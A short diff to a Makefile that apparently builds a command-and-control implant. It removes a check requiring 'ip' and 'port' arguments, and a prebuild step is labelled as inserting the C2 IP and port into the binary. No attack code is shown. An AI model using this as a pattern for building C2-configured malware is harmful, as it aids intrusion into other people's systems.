@@ -11,17 +11,7 @@ ASMOBJ = $(ASMSRC:.asm=.o)
 TARGET= bin/main.exe
 
 
-all: ArgsCheck prebuild $(ASMOBJ) $(COBJ) $(TARGET) clean
-
-ArgsCheck:
-	@if [ -z "$(ip)" ]; then \
-		echo "Error: 'ip' argument is required."; \
-    	exit 1; \
-	fi
-	@if [ -z "$(port)" ]; then \
-		echo "Error: 'port' argument is required."; \
-		exit 1; \
-	fi
+all: prebuild $(ASMOBJ) $(COBJ) $(TARGET) clean
 
 prebuild:
 	@ echo "Adding the C2 IP and PORT."
